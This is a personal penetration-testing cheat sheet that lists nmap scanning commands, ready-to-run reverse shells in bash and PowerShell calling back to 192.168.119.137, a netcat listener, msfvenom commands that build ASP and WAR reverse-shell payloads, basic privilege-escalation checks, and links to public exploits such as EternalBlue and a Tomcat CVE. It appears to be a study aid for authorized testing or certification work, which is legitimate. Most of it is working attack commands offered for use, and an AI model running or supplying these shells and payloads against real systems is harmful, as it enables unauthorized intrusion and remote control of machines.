# Pentest Cheat Sheet
There are many cheat sheets out there, but this is mine.


## Recon

### Port Scanning

`nmap -sn 10.11.1.0/24` network sweep to find hosts. 
  * `nmap -sn  10.11.1.0/24 -oG - | awk '/Up$/{print $2}' > list_ips.txt` sweep network for IP's that are up, and save the IP addresses in a list.

`nmap -A 10.10.10.10` for a quick scan of common TCP ports with OS and service detection.

`nmap -A 10.10.10.10 -p-` to scan all TCP ports with OS and service detection.

`nmap -A -sU 10.10.10.10` to scan all UDP ports with OS and service detection.

### Directory Enumeration


## Reverse Shells

### Bash
`/bin/bash -i >& /dev/tcp/192.168.119.137/1337 0>&1`

### PowerShell
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.137',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Listeners

#### Netat
`nc -lvp 4444` listen (catch) reverse shell with Netcat on port 4444

### Span TTY Shell
`python -c 'import pty; pty.spawn("/bin/bash")'`

### MSFVenom
#### ASP
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.137 LPORT=4444 -f asp > shell.asp`

#### WAR
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.137 LPORT=4444 -f war > shell.war`


## Privilege Escalation
### Linux

`sudo -l`, if there's anything interesting like running scripts as users with `NOPASSWD: ALL`.

### Windows
`systeminfo` to get good info.

`tasklist /SVC` to view running services.


## Useful Exploits

### Linux/Unix

#### Distro Version
* `cat /etc/issue`

#### Kernel Version and Architecture
* `uname -r `
* `arch`

### Windows
#### MS17-010 (Eternal Blue)
* [AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)

#### MS03-026
* [RPC DCOM](https://www.exploit-db.com/exploits/66)

### Apache Tomcat
#### CVE-2017-12617
* [CVE-2017-12617](https://github.com/cyberheartmi9/CVE-2017-12617)


## Further Help
* [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html)
